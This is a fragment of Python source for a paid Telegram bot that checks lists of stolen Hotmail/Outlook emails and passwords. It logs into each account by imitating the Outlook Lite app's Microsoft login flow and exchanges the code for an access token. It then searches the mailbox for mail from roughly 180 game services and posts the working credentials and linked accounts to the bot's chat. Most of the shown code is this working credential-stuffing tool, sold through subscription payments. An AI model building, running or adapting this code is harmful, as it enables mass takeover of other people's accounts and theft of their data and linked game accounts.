    V143 = 'ִ𓍼 ✅ ⌇ 𝗛𝗮𝘆 𝗗𝗮𝘆 . 𓍲' if 'noreply@supercell.com' in rese or 'support@supercell.com' in rese else None
    V144 = 'ִ𓍼 ✅ ⌇ 𝗕𝗼𝗼𝗺 𝗕𝗲𝗮𝗰𝗵 . 𓍲' if 'noreply@supercell.com' in rese or 'support@supercell.com' in rese else None
    V145 = 'ִ𓍼 ✅ ⌇ 𝗖𝗼𝗰 . 𓍲' if 'noreply@supercell.com' in rese or 'support@supercell.com' in rese else None
    V146 = 'ִ𓍼 ✅ ⌇ 𝗔𝗻𝗴𝗿𝘆 𝗕𝗶𝗿𝗱𝘀 . 𓍲' if 'noreply@rovio.com' in rese or 'support@rovio.com' in rese else None
    V147 = 'ִ𓍼 ✅ ⌇ 𝗦𝘂𝗯𝘄𝗮𝘆 𝗦𝘂𝗿𝗳𝗲𝗿𝘀 . 𓍲' if 'noreply@sybo.com' in rese or 'support@sybo.com' in rese else None
    V148 = 'ִ𓍼 ✅ ⌇ 𝗧𝗲𝗺𝗽𝗹𝗲 𝗥𝘂𝗻 . 𓍲' if 'noreply@imangi.com' in rese or 'support@imangi.com' in rese else None
    V149 = 'ִ𓍼 ✅ ⌇ 𝗖𝗮𝗻𝗱𝘆 𝗖𝗿𝘂𝘀𝗵 . 𓍲' if 'noreply@king.com' in rese or 'support@king.com' in rese else None
    V150 = 'ִ𓍼 ✅ ⌇ 𝗙𝗮𝗿𝗺𝘃𝗶𝗹𝗹𝗲 . 𓍲' if 'noreply@zynga.com' in rese or 'support@zynga.com' in rese else None
    V151 = 'ִ𓍼 ✅ ⌇ 𝗪𝗼𝗿𝗱𝘀 𝗪𝗶𝘁𝗵 𝗙𝗿𝗶𝗲𝗻𝗱𝘀 . 𓍲' if 'noreply@zynga.com' in rese or 'support@zynga.com' in rese else None
    V152 = 'ִ𓍼 ✅ ⌇ 𝗣𝗼𝗸𝗲𝗺𝗼𝗻 𝗚𝗼 . 𓍲' if 'noreply@pokemongo.com' in rese or 'support@pokemongo.com' in rese else None
    V153 = 'ִ𓍼 ✅ ⌇ 𝗠𝗼𝗻𝘀𝘁𝗲𝗿 𝗦𝘁𝗿𝗶𝗸𝗲 . 𓍲' if 'noreply@monsterstrike.com' in rese or 'support@monsterstrike.com' in rese else None
    V154 = 'ִ𓍼 ✅ ⌇ 𝗙𝗶𝗻𝗮𝗹 𝗙𝗮𝗻𝘁𝗮𝘀𝘆 . 𓍲' if 'noreply@square-enix.com' in rese or 'support@square-enix.com' in rese else None
    V155 = 'ִ𓍼 ✅ ⌇ 𝗗𝗿𝗮𝗴𝗼𝗻 𝗤𝘂𝗲𝘀𝘁 . 𓍲' if 'noreply@square-enix.com' in rese or 'support@square-enix.com' in rese else None
    V156 = 'ִ𓍼 ✅ ⌇ 𝗙𝗶𝗿𝗲 𝗘𝗺𝗯𝗹𝗲𝗺 . 𓍲' if 'noreply@nintendo.com' in rese or 'support@nintendo.com' in rese else None
    V157 = 'ִ𓍼 ✅ ⌇ 𝗭𝗲𝗹𝗱𝗮 . 𓍲' if 'noreply@nintendo.com' in rese or 'support@nintendo.com' in rese else None
    V158 = 'ִ𓍼 ✅ ⌇ 𝗠𝗮𝗿𝗶𝗼 𝗞𝗮𝗿𝘁 . 𓍲' if 'noreply@nintendo.com' in rese or 'support@nintendo.com' in rese else None
    V159 = 'ִ𓍼 ✅ ⌇ 𝗦𝗽𝗹𝗮𝘁𝗼𝗼𝗻 . 𓍲' if 'noreply@nintendo.com' in rese or 'support@nintendo.com' in rese else None
    V160 = 'ִ𓍼 ✅ ⌇ 𝗔𝗻𝗶𝗺𝗮𝗹 𝗖𝗿𝗼𝘀𝘀𝗶𝗻𝗴 . 𓍲' if 'noreply@nintendo.com' in rese or 'support@nintendo.com' in rese else None
    V161 = 'ִ𓍼 ✅ ⌇ 𝗦𝘂𝗽𝗲𝗿 𝗠𝗮𝗿𝗶𝗼 . 𓍲' if 'noreply@nintendo.com' in rese or 'support@nintendo.com' in rese else None
    V162 = 'ִ𓍼 ✅ ⌇ 𝗠𝗲𝘁𝗿𝗼𝗶𝗱 . 𓍲' if 'noreply@nintendo.com' in rese or 'support@nintendo.com' in rese else None
    V163 = 'ִ𓍼 ✅ ⌇ 𝗦𝗺𝗮𝘀𝗵 𝗕𝗿𝗼𝘀 . 𓍲' if 'noreply@nintendo.com' in rese or 'support@nintendo.com' in rese else None
    V164 = 'ִ𓍼 ✅ ⌇ 𝗣𝗼𝗸𝗲𝗺𝗼𝗻 𝗨𝗻𝗶𝘁𝗲 . 𓍲' if 'noreply@pokemon.com' in rese or 'support@pokemon.com' in rese else None
    V165 = 'ִ𓍼 ✅ ⌇ 𝗗𝗶𝗴𝗶𝗺𝗼𝗻 . 𓍲' if 'noreply@bandai.com' in rese or 'support@bandai.com' in rese else None
    V166 = 'ִ𓍼 ✅ ⌇ 𝗬𝘂-𝗚𝗶-𝗢𝗵! . 𓍲' if 'noreply@konami.com' in rese or 'support@konami.com' in rese else None
    V167 = 'ִ𓍼 ✅ ⌇ 𝗠𝗼𝗻𝘀𝘁𝗲𝗿 𝗛𝘂𝗻𝘁𝗲𝗿 . 𓍲' if 'noreply@capcom.com' in rese or 'support@capcom.com' in rese else None
    V168 = 'ִ𓍼 ✅ ⌇ 𝗦𝘁𝗿𝗲𝗲𝘁 𝗙𝗶𝗴𝗵𝘁𝗲𝗿 . 𓍲' if 'noreply@capcom.com' in rese or 'support@capcom.com' in rese else None
    V169 = 'ִ𓍼 ✅ ⌇ 𝗥𝗲𝘀𝗶𝗱𝗲𝗻𝘁 𝗘𝘃𝗶𝗹 . 𓍲' if 'noreply@capcom.com' in rese or 'support@capcom.com' in rese else None
    V170 = 'ִ𓍼 ✅ ⌇ 𝗗𝗲𝘃𝗶𝗹 𝗠𝗮𝘆 𝗖𝗿𝘆 . 𓍲' if 'noreply@capcom.com' in rese or 'support@capcom.com' in rese else None
    V171 = 'ִ𓍼 ✅ ⌇ 𝗧𝗲𝗸𝗸𝗲𝗻 . 𓍲' if 'noreply@bandainamco.com' in rese or 'support@bandainamco.com' in rese else None
    V172 = 'ִ𓍼 ✅ ⌇ 𝗦𝗼𝘂𝗹𝗰𝗮𝗹𝗶𝗯𝘂𝗿 . 𓍲' if 'noreply@bandainamco.com' in rese or 'support@bandainamco.com' in rese else None
    V173 = 'ִ𓍼 ✅ ⌇ 𝗗𝗮𝗿𝗸 𝗦𝗼𝘂𝗹𝘀 . 𓍲' if 'noreply@fromsoftware.com' in rese or 'support@fromsoftware.com' in rese else None
    V174 = 'ִ𓍼 ✅ ⌇ 𝗦𝗲𝗸𝗶𝗿𝗼 . 𓍲' if 'noreply@fromsoftware.com' in rese or 'support@fromsoftware.com' in rese else None
    V175 = 'ִ𓍼 ✅ ⌇ 𝗘𝗹𝗱𝗲𝗻 𝗥𝗶𝗻𝗴 . 𓍲' if 'noreply@fromsoftware.com' in rese or 'support@fromsoftware.com' in rese else None
    V176 = 'ִ𓍼 ✅ ⌇ 𝗕𝗹𝘇𝗮𝗿𝗱 . 𓍲' if 'noreply@blizzard.com' in rese or 'support@blizzard.com' in rese else None
    V177 = 'ִ𓍼 ✅ ⌇ 𝗖𝗮𝗹𝗹 𝗼𝗳 𝗗𝘂𝘁𝘆 𝗪𝗮𝗿𝘇𝗼𝗻𝗲 . 𓍲' if 'noreply@activision.com' in rese or 'support@activision.com' in rese else None
    V178 = 'ִ𓍼 ✅ ⌇ 𝗖𝗮𝗹𝗹 𝗼𝗳 𝗗𝘂𝘁𝘆 𝗠𝗼𝗯𝗶𝗹𝗲 . 𓍲' if 'noreply@activision.com' in rese or 'support@activision.com' in rese else None
    V179 = 'ִ𓍼 ✅ ⌇ 𝗖𝗮𝗹𝗹 𝗼𝗳 𝗗𝘂𝘁𝘆 𝗩𝗮𝗻𝗴𝘂𝗮𝗿𝗱 . 𓍲' if 'noreply@activision.com' in rese or 'support@activision.com' in rese else None
    V180 = 'ִ𓍼 ✅ ⌇ 𝗖𝗮𝗹𝗹 𝗼𝗳 𝗗𝘂𝘁𝘆 𝗕𝗹𝗮𝗰𝗸 𝗢𝗽𝘀 . 𓍲' if 'noreply@activision.com' in rese or'support@activision.com' in rese else None
    xb = filter(None,[V1, V2, V3, V4, V5, V6, V7, V8, V9, V10, V11, V12, V13, V14, V15, V16, V17, V18, V19, V20, V21, V22, V23, V24, V25, V26, V27, V28, V29, V30, V31, V32, V33, V34, V35, V36, V37, V38, V39, V40, V41, V42, V43, V44, V45, V46, V47, V48, V49, V50, V51, V52, V53, V54, V55, V56, V57, V58, V59, V60, V61, V62, V63, V64, V65, V66, V67, V68, V69, V70, V71, V72, V73, V74, V75, V76, V77, V78, V79, V80, V81, V82, V83, V84, V85, V86, V87, V88, V89, V90, V91, V92, V93, V94, V95, V96, V97, V98, V99, V100,V101, V102, V103, V104, V105, V106, V107, V108, V109, V110, V111, V112, V113, V114, V115, V116, V117, V118, V119, V120, V121, V122, V123, V124, V125, V126, V127, V128, V129, V130, V131, V132, V133, V134, V135, V136, V137, V138, V139, V140,V141, V142, V143, V144, V145, V146, V147, V148, V149, V150,V151, V152, V153, V154, V155, V156, V157, V158, V159, V160,V161, V162, V163, V164, V165, V166, V167, V168, V169, V170, V171, V172, V173, V174, V175, V176, V177, V178, V179, V180]) 
    zm = "\n".join(xb)
 

    jssj = {"AD": "🇦🇩","AE": "🇦🇪","AF": "🇦🇫","AG": "🇦🇬","AI": "🇦🇮","AL": "🇦🇱","AM": "🇦🇲","AO": "🇦🇴","AQ": "🇦🇶","AR": "🇦🇷","AS": "🇦🇸","AT": "🇦🇹","AU": "🇦🇺","AW": "🇦🇼","AX": "🇦🇽","AZ": "🇦🇿","BA": "🇧🇦","BB": "🇧🇧","BD": "🇧🇩","BE": "🇧🇪","BF": "🇧🇫","BG": "🇧🇬","BH": "🇧🇭","BI": "🇧🇮","BJ": "🇧🇯","BL": "🇧🇱","BM": "🇧🇲","BN": "🇧🇳","BO": "🇧🇴","BQ": "🇧🇶","BR": "🇧🇷","BS": "🇧🇸","BT": "🇧🇹","BV": "🇧🇻","BW": "🇧🇼","BY": "🇧🇾","BZ": "🇧🇿","CA": "🇨🇦","CC": "🇨🇨","CD": "🇨🇩","CF": "🇨🇫","CG": "🇨🇬","CH": "🇨🇭","CI": "🇨🇮","CK": "🇨🇰","CL": "🇨🇱","CM": "🇨🇲","CN": "🇨🇳","CO": "🇨🇴","CR": "🇨🇷","CU": "🇨🇺","CV": "🇨🇻","CW": "🇨🇼","CX": "🇨🇽","CY": "🇨🇾","CZ": "🇨🇿","DE": "🇩🇪","DJ": "🇩🇯","DK": "🇩🇰","DM": "🇩🇲","DO": "🇩🇴","DZ": "🇩🇿","EC": "🇪🇨","EE": "🇪🇪","EG": "🇪🇬","EH": "🇪🇭","ER": "🇪🇷","ES": "🇪🇸","ET": "🇪🇹","EU": "🇪🇺","FI": "🇫🇮","FJ": "🇫🇯","FK": "🇫🇰","FM": "🇫🇲","FO": "🇫🇴","FR": "🇫🇷","GA": "🇬🇦","GB-ENG": "🏴","GB-NIR": "🏴","GB-SCT": "🏴","GB-WLS": "🏴","GB": "🇬🇧","GD": "🇬🇩","GE": "🇬🇪","GF": "🇬🇫","GG": "🇬🇬","GH": "🇬🇭","GI": "🇬🇮","GL": "🇬🇱","GM": "🇬🇲","GN": "🇬🇳","GP": "🇬🇵","GQ": "🇬🇶","GR": "🇬🇷","GS": "🇬🇸","GT": "🇬🇹","GU": "🇬🇺","GW": "🇬🇼","GY": "🇬🇾","HK": "🇭🇰","HM": "🇭🇲","HN": "🇭🇳","HR": "🇭🇷","HT": "🇭🇹","HU": "🇭🇺","ID": "🇮🇩","IE": "🇮🇪","IL": "🇮🇱","IM": "🇮🇲","IN": "🇮🇳","IO": "🇮🇴","IQ": "🇮🇶","IR": "🇮🇷","IS": "🇮🇸","IT": "🇮🇹","JE": "🇯🇪","JM": "🇯🇲","JO": "🇯🇴","JP": "🇯🇵","KE": "🇰🇪","KG": "🇰🇬","KH": "🇰🇭","KI": "🇰🇮","KM": "🇰🇲","KN": "🇰🇳","KP": "🇰🇵","KR": "🇰🇷","KW": "🇰🇼","KY": "🇰🇾","KZ": "🇰🇿","LA": "🇱🇦","LB": "🇱🇧","LC": "🇱🇨","LI": "🇱🇮","LK": "🇱🇰","LR": "🇱🇷","LS": "🇱🇸","LT": "🇱🇹","LU": "🇱🇺","LV": "🇱🇻","LY": "🇱🇾","MA": "🇲🇦","MC": "🇲🇨","MD": "🇲🇩","ME": "🇲🇪","MF": "🇲🇫","MG": "🇲🇬","MH": "🇲🇭","MK": "🇲🇰","ML": "🇲🇱","MM": "🇲🇲","MN": "🇲🇳","MO": "🇲🇴","MP": "🇲🇵","MQ": "🇲🇶","MR": "🇲🇷","MS": "🇲🇸","MT": "🇲🇹","MU": "🇲🇺","MV": "🇲🇻","MW": "🇲🇼","MX": "🇲🇽","MY": "🇲🇾","MZ": "🇲🇿","NA": "🇳🇦","NC": "🇳🇨","NE": "🇳🇪","NF": "🇳🇫","NG": "🇳🇬","NI": "🇳🇮","NL": "🇳🇱","NO": "🇳🇴","NP": "🇳🇵","NR": "🇳🇷","NU": "🇳🇺","NZ": "🇳🇿","OM": "🇴🇲","PA": "🇵🇦","PE": "🇵🇪","PF": "🇵🇫","PG": "🇵🇬","PH": "🇵🇭","PK": "🇵🇰","PL": "🇵🇱","PM": "🇵🇲","PN": "🇵🇳","PR": "🇵🇷","PS": "🇵🇸","PT": "🇵🇹","PW": "🇵🇼","PY": "🇵🇾","QA": "🇶🇦","RE": "🇷🇪","RO": "🇷🇴","RS": "🇷🇸","RU": "🇷🇺","RW": "🇷🇼","SA": "🇸🇦","SB": "🇸🇧","SC": "🇸🇨","SD": "🇸🇩","SE": "🇸🇪","SG": "🇸🇬","SH": "🇸🇭","SI": "🇸🇮","SJ": "🇸🇯","SK": "🇸🇰","SL": "🇸🇱","SM": "🇸🇲","SN": "🇸🇳","SO": "🇸🇴","SR": "🇸🇷","SS": "🇸🇸","ST": "🇸🇹","SV": "🇸🇻","SX": "🇸🇽","SY": "🇸🇾","SZ": "🇸🇿","TC": "🇹🇨","TD": "🇹🇩","TF": "🇹🇫","TG": "🇹🇬","TH": "🇹🇭","TJ": "🇹🇯","TK": "🇹🇰","TL": "🇹🇱","TM": "🇹🇲","TN": "🇹🇳","TO": "🇹🇴","TR": "🇹🇷","TT": "🇹🇹","TV": "🇹🇻","TW": "🇹🇼","TZ": "🇹🇿","UA": "🇺🇦","UG": "🇺🇬","UM": "🇺🇲","US": "🇺🇸","UY": "🇺🇾","UZ": "🇺🇿","VA": "🇻🇦","VC": "🇻🇨","VE": "🇻🇪","VG": "🇻🇬","VI": "🇻🇮","VN": "🇻🇳","VU": "🇻🇺","WF": "🇼🇫","WS": "🇼🇸","XK": "🇽🇰","YE": "🇾🇪","YT": "🇾🇹","ZA": "🇿🇦","ZM": "🇿🇲","ZW": "🇿🇼"}
    cccc = jssj.get(Loca, '❔')
    message = f"""⭒───ׅ┄ׅ─ׂ─ׅ─ׂ─ׅ─ ۰ 𝗔𝗰𝗰𝗼𝘂𝗻𝘁 ۰ ─ׂ─ׅ─ׂ─ׅ─ׂ─ׅ┄ׅ───⭒
𓇢 ⨾ 𝗘𝗺𝗮𝗶𝗹 ✦ 〔 `{Email}` 〕
𓇢 ⨾ 𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱 ✦ 〔 `{Password}` 〕
⭒───ׅ┄ׅ─ׂ─ׅ─ׂ─ׅ─ ۰ 𝗜𝗡𝗙𝗢 ۰ ─ׂ─ׅ─ׂ─ׅ─ׂ─ׅ┄ׅ───⭒
𓇢 ⨾ 𝗡𝗮𝗺𝗲 ✦ 〔 `{name}` 〕
𓇢 ⨾ 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ✦ 〔 `{cccc}` 〕
⭒───ׅ┄ׅ─ׂ─ׅ─ׂ─ׅ─ ۰ 𝗟𝗶𝗻𝗸𝗶𝗻𝗴 ۰ ─ׂ─ׅ─ׂ─ׅ─ׂ─ׅ┄ׅ───⭒
{zm}
**𝗕𝗬:** [𓌹 𝗡𝗜𝗡𝗝𝗔 𖢃](http://t.me/Sso0ng)
"""
    bot.send_message(chat_id, message, parse_mode="Markdown")
def get_token(Email, Password, cook, hh, chat_id) -> str:
    Code = hh.get('Location').split('code=')[1].split('&')[0]
    CID = cook.get('MSPCID').upper()
    try:
        url = "https://login.microsoftonline.com/consumers/oauth2/v2.0/token"
        data = {
            "client_info": "1",
            "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
            "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
            "grant_type": "authorization_code",
            "code": Code,
            "scope": "profile openid offline_access https://outlook.office.com/M365.Access"
        }
        response = requests.post(url, data=data, headers={"Content-Type": "application/x-www-form-urlencoded"})
        token = response.json()["access_token"]
        get_infoo(Email, Password, token, CID, chat_id)
    except Exception as e:
        print(f"Error getting token: {e}")

def login_protocol(Email, Password, URL, PPFT, AD, MSPRequ, uaid, RefreshTokenSso, MSPOK, OParams, chat_id) -> str:
    global a, b
    try:
        lenn = f"i13=1&login={Email}&loginfmt={Email}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={Password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={PPFT}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960"
        Ln = len(lenn)
        headers = {
            "Host": "login.live.com",
            "Connection": "keep-alive",
            "Content-Length": str(Ln),
            "Cache-Control": "max-age=0",
            "Upgrade-Insecure-Requests": "1",
            "Origin": "https://login.live.com",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36 PKeyAuth/1.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "X-Requested-With": "com.microsoft.outlooklite",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-User": "?1",
            "Sec-Fetch-Dest": "document",
            "Referer": f"{AD}haschrome=1",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-US,en;q=0.9",
            "Cookie": f"MSPRequ={MSPRequ};uaid={uaid}; RefreshTokenSso={RefreshTokenSso}; MSPOK={MSPOK}; OParams={OParams}; MicrosoftApplicationsTelemetryDeviceId={uuid.uuid4()}"
        }
        res = requests.post(URL, data=lenn, headers=headers, allow_redirects=False)
        cook = res.cookies.get_dict()
        hh = res.headers
        if any(key in cook for key in ["JSH", "JSHP", "ANON", "WLSSC"]) or res.text == '':
            get_token(Email, Password, cook, hh, chat_id)
            a += 1
        elif 'Too Many Requests' in res.text:
            login_protocol(Email, Password, URL, PPFT, AD, MSPRequ, uaid, RefreshTokenSso, MSPOK, OParams, chat_id)
        else:
            b += 1
 
    except Exception as e:
        print(f"Error in login protocol: {e}")
def generate_buttons(start_time=None):
    """
    إنشاء أزرار تفاعلية لعرض الإحصائيات.
    """
    elapsed_time = f"{round(time.time() - start_time, 2)}s" if start_time else "0s"
    success_rate = round((a / (a + b)) * 100, 2) if (a + b) > 0 else 0

    buttons = types.InlineKeyboardMarkup(row_width=2)
    buttons.add(
        types.InlineKeyboardButton(f"✅ Valid: {a}", callback_data='valid_count'),
        types.InlineKeyboardButton(f"⏳ Elapsed Time: {elapsed_time}", callback_data='elapsed_time')# زر All Hits
    )
    return buttons
def get_values(Email, Password, chat_id):
    headers = {
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36 PKeyAuth/1.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "return-client-request-id": "false",
        "client-request-id": "205740b4-7709-4500-a45b-b8e12f66c738",
        "x-ms-sso-ignore-sso": "1",
        "correlation-id": str(uuid.uuid4()),
        "x-client-ver": "1.1.0+9e54a0d1",
        "x-client-os": "28",
        "x-client-sku": "MSAL.xplat.android",
        "x-client-src-sku": "MSAL.xplat.android",
        "X-Requested-With": "com.microsoft.outlooklite",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q=0.9",
    }
    try:
        response = requests.get(
            f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={Email}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D",
            headers=headers
        )
        cok = response.cookies.get_dict()
        URL = response.text.split("urlPost:'")[1].split("'")[0]
        PPFT = response.text.split('name="PPFT" id="i0327" value="')[1].split("'")[0]
        AD = response.url.split('haschrome=1')[0]
        MSPRequ = cok['MSPRequ']
        uaid = cok['uaid']
        RefreshTokenSso = cok['RefreshTokenSso']
        MSPOK = cok['MSPOK']
        OParams = cok['OParams']
        login_protocol(Email, Password, URL, PPFT, AD, MSPRequ, uaid, RefreshTokenSso, MSPOK, OParams, chat_id)
    except Exception as e:
        print(f"Error getting values: {e}")



# ملف JSON لتخزين البيانات
DATA_FILE = 'data.json'

# تحميل البيانات من ملف JSON
def load_data():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, 'r') as file:
            return json.load(file)
    return {"users": {}, "codes": {}, "settings": {"price_per_hour": 5}}  # السعر الافتراضي: 5 نجوم للساعة

# حفظ البيانات إلى ملف JSON
def save_data(data):
    with open(DATA_FILE, 'w') as file:
        json.dump(data, file, indent=4)

# قائمة الأدمن
ADMINS = [5955963998]  # استبدل بمعرفات الأدمن

# أوامر البوت
@bot.message_handler(commands=["start"])
def start(message):
    
    
    sent_message = bot.send_message(chat_id=message.chat.id, text='''💥
    ''')
    
    time.sleep(1.5)
    
    mes = types.InlineKeyboardMarkup(row_width=1)
    mero = types.InlineKeyboardButton("Rigister", callback_data='Rigister')
    buy = types.InlineKeyboardButton("Buy Vip", callback_data='Buy')
    mes.add(mero, buy)
    name = message.from_user.first_name
    bot.edit_message_text(chat_id=message.chat.id, message_id=sent_message.message_id, text=f'''Hi {name} 🌟 أهلاً وسهلاً في بوت فحص حسابات هوتميل! 🌟

هذا البوت بيساعدك على فحص حسابات هوتميل واكتشاف الحسابات المرتبطة بكل حساب
بدون مقدمات ارسل الكومبو لفحصه               ''', reply_markup=mes)
    
@bot.callback_query_handler(func=lambda call: call.data == 'start')
def start(call):
    mes = types.InlineKeyboardMarkup(row_width=1)
    mero = types.InlineKeyboardButton("Rigister", callback_data='Rigister')
    buy = types.InlineKeyboardButton("Buy Vip", callback_data='Buy')
    mes.add(mero,buy)
    name = call.from_user.first_name
    bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=f'''Hi {name} 🌟 أهلاً وسهلاً في بوت فحص حسابات هوتميل! 🌟

هذا البوت بيساعدك على فحص حسابات هوتميل واكتشاف الحسابات المرتبطة بكل حساب
بدون مقدمات ارسل الكومبو لفحصه               ''', reply_markup=mes)
    

@bot.message_handler(commands=['info'])
def info(message):
    user_id = str(message.chat.id)

    # قراءة البيانات الحالية من الملف
    data = read_data()

    # التحقق مما إذا كان المستخدم مسجلًا
    if user_id in data:
        user_data = data[user_id]
        response = f"البيانات الخاصة بك:\nالخطة: {user_data['plan']}\nالوقت: {user_data['timer']}"
    else:
        response = "لم يتم العثور على بياناتك. يرجى التسجيل أولاً باستخدام الأمر /register."

    bot.reply_to(message, response)

def read_data():
    try:
        with open('data.json', 'r') as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def write_data(data):
    with open('data.json', 'w') as file:
        json.dump(data, file, ensure_ascii=False, indent=4)



@bot.callback_query_handler(func=lambda call: call.data == 'Rigister')
def register(call):
    user_id = str(call.message.chat.id)  # تحويل معرف المستخدم إلى نص لتجنب المشاكل مع JSON
    plan = "𝗙𝗥𝗘𝗘"
    timer = "none"

    # قراءة البيانات الحالية من الملف
    data = read_data()

    # التحقق مما إذا كان المستخدم مسجلًا من قبل
    if user_id in data:
        bot.reply_to(call.message, "أنت مسجل بالفعل. استخدم /info")
    else:
        # تحديث البيانات
        data[user_id] = {
            "plan": plan,
            "timer": timer
        }

        # كتابة البيانات إلى الملف
        write_data(data)
        bot.reply_to(call.message, "تم تسجيل البيانات بنجاح!")

def read_data():
    try:
        with open('data.json', 'r') as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def write_data(data):
    with open('data.json', 'w') as file:
        json.dump(data, file, ensure_ascii=False, indent=4)
@bot.message_handler(func=lambda message: message.text.lower().startswith('.register') or message.text.lower().startswith('/register'))
def register(message):
    user_id = str(message.chat.id)  # تحويل معرف المستخدم إلى نص لتجنب المشاكل مع JSON
    plan = "𝗙𝗥𝗘𝗘"
    timer = "none"

    # قراءة البيانات الحالية من الملف
    data = read_data()

    # التحقق مما إذا كان المستخدم مسجلًا من قبل
    if user_id in data:
        bot.reply_to(message, "أنت مسجل بالفعل. استخدم /info")
    else:
        # تحديث البيانات
        data[user_id] = {
            "plan": plan,
            "timer": timer
        }

        # كتابة البيانات إلى الملف
        write_data(data)
        bot.reply_to(message, "تم تسجيل البيانات بنجاح!")

def read_data():
    try:
        with open('data.json', 'r') as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def write_data(data):
    with open('data.json', 'w') as file:
        json.dump(data, file, ensure_ascii=False, indent=4)
@bot.callback_query_handler(func=lambda call: call.data == 'Buy')
def gates(call):
    markup = types.InlineKeyboardMarkup(row_width=1)
    gate_btn = types.InlineKeyboardButton("1 Hour", callback_data="buy_1hour")
    lock_btn = types.InlineKeyboardButton("1 Day", callback_data="buy_1day")
    unlock_btn = types.InlineKeyboardButton("1 Weak", callback_data="buy_1week")
    un_btn = types.InlineKeyboardButton("1 Month", callback_data="buy_1month")
    back = types.InlineKeyboardButton("  Back  ", callback_data="start")
    markup.add(gate_btn, lock_btn, unlock_btn, un_btn, back)
    bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="اختر مده الاشتراك", reply_markup=markup)
@bot.callback_query_handler(func=lambda call: call.data == 'buy_1hour')
def process_payment(call):
    SERVICE_COST = '5'
    prices = [
        LabeledPrice(label="اشتراك لمده ساعه", amount=SERVICE_COST * 1)
    ]  

    bot.send_invoice(
        chat_id=call.message.chat.id,
        title="اشتراك لمده ساعه",
        description=f"ادفع {SERVICE_COST} نجمة للاشتراك ساعه في البوت",
        provider_token="",
        currency="XTR",
        prices=prices,
        start_parameter="pay_with_stars",
        invoice_payload="Star-Payment-Payload",
    )


@bot.pre_checkout_query_handler(func=lambda query: True)
def checkout_handler(pre_checkout_query):
    bot.answer_pre_checkout_query(pre_checkout_query.id, ok=True)


@bot.message_handler(content_types=["successful_payment"])
def successful_payment(message):
    bot.send_message(message.chat.id, "تم الدفع بنجاح! شكرًا لاستخدامك الخدمة.")
    h=1
    with open('data.json', 'r') as json_file:
    	existing_data = json.load(json_file)
    	characters = string.ascii_uppercase + string.digits
    	pas ='NINJA-'+''.join(random.choices(characters, k=4))+'-'+''.join(random.choices(characters, k=4))+'-'+''.join(random.choices(characters, k=4))
    	current_time = datetime.now()
    	ig = current_time + timedelta(hours=h)
    	plan='vip'
    	parts = str(ig).split(':')
    	ig = ':'.join(parts[:2])
    	with open('data.json', 'r') as json_file:
    		existing_data = json.load(json_file)
    		new_data = {
				pas : {
	  "plan": plan,
	  "time": ig,
			}
			}
    		existing_data.update(new_data)
    		with open('data.json', 'w') as json_file:
    			json.dump(existing_data, json_file, ensure_ascii=False, indent=4)	
    			msg=f'''<b>
Payment Done Sucssesfully

This The Code 
You Can Redeem It Or Send It gift for your frined 

├𝗦𝗧𝗔𝗧𝗨𝗦»»»{plan}
├𝗘𝘅𝗽𝗶𝗿𝗲𝘀 𝗼𝗻»»»{ig}
├『Sso0ng』
├𝑲𝒆𝒚  <code>{pas}</code>	
├𝙐𝙨𝙖𝙜𝙚 /redeem [𝗞𝗘𝗬]
BOT :@NINJA_OUTLOOK_BOT🕸
</b>'''
    			bot.send_message(message.chat.id,msg,parse_mode="HTML")


@bot.callback_query_handler(func=lambda call: call.data == 'buy_1day')
def process_payment(call):
    SERVICE_COST = '20'
    prices = [
        LabeledPrice(label="اشتراك لمده يوم", amount=SERVICE_COST * 1)
    ]  

    bot.send_invoice(
        chat_id=call.message.chat.id,
        title="اشتراك لمده يوم",
        description=f"ادفع {SERVICE_COST} نجمة للاشتراك يوم في البوت",
        provider_token="",
        currency="XTR",
        prices=prices,
        start_parameter="pay_with_stars",
        invoice_payload="Star-Payment-Payload",
    )


@bot.pre_checkout_query_handler(func=lambda query: True)
def checkout_handler(pre_checkout_query):
